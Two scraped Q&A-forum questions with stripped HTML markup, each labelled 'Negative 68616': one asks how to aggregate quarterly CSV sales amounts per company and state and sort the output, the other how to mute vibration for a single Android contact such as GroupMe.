Negative 68616 pI have a data set in a CSV file. Here is a samplep  precodeTime,Location,Companyid,Metrics,Amount  2012Q1,AK995,A,Sales,8820156.363 2012Q1,AK995,B,Revenue,28392730.51 2012Q1,AK995,C,Sales,6980332.166 2012Q1,AK996,B,Revenue,1894254.13 2012Q1,AK996,A,Sales,4664103.766 2012Q2,AK995,C,Sales,7980332.166 codepre  pHere the codetimecode is the year and quarter, codelocationcode is the state symbol with an ID so each state may have multiple rows with different IDs per codecompanyidcode. What I want to do is that for each codecompanyidcode I want to add all the codeamountcode for a particular state per specific codetimecode. For example in above sample codecompanyidcode 1 has two records for codetimecode code2012Q1code  one for codeAK995code and one for codeAK996code. I want to add amount in these two and just have AK as codelocationcode, to get one record with values code2012Q1,AK,1,13484260.129code. This should be done for each codecompanycode per codetimecode period for all the states. Note that codeamountscode across codetimecode should not be added as in above sample codecompanyidcode code3code had 2 records for same state but in different codetimecode period. Also I want to do this only where codeMetricscode is codeSalescode so I want to remove any row where codeMetricscode is other than codeSalescode and dont add those amount too in aggregation.p  pI also want to write the output to another csv file. How can I do this    p  pstrongUPDATE SECTIONstrong p  pAs per suggestion of strongMichaelLaszlostrong I have this code. The code seems to have one issue. What I want in the output file is to have all the records for a particular codecompanyidcode to come together. The ordering of records within a codecompanyidcode should be in the increasing order of codetimecode per codelocationcode wise records for a particular location come together for a particular codecompanyidcode. So for example if there is a codecompanyidcode codeBcode then all the records of codecompanyidcode codeBcode should be together and there order should be as belowp  precodecompanyid,state,time,amount B,AK,2010Q1,5000 B,AK,2010Q2,5100 B,AK,2010Q3,4300 B,AK,2010Q4,4350 B,AK,2011Q1,5600 codepre  pAs you can see above all the records of codecompanyidcode codeBcode are together and within codecompanyidcode codeBcode records for a particular codelocationcode are together in the order of codetimecode. In my current output I get records for all the codecompanyidscode scattered.

Negative 68616 pI have a a hrefhttpsgroupme.com relnofollowGroupMea contact on my Android phone which I get messages from all the time. It is really annoying, so I can either mute text the GroupMe server and stop getting messages or mute my phone vibrations altogether. The problem with these solutions is that I dont want to completely mute the messages from the server altogether. I want to be able to read them when I decide to. I also dont want to mute my phone altogether because then I cant tell if someone else tried to text me.p  pI tried searching online for help on the topic and I came across the a hrefhttpsplay.google.comstoreappsdetailsidac.vibrationamphlen relnofollowContact Vibratea application. It had a bunch of features and seemed pretty messy in organization. You could set custom vibrate patterns for each of your contacts. I noticed that it had plenty of default vibrate patterns, but none that just vibrated once and none that vibrated zero times. I tried to create one that didnt vibrate, but that didnt work. I ended up deleting the app altogether.p  pI still havent found a way to silence the vibrate messages for that specific contact while allowing the messages themselves to be received. Solutionp
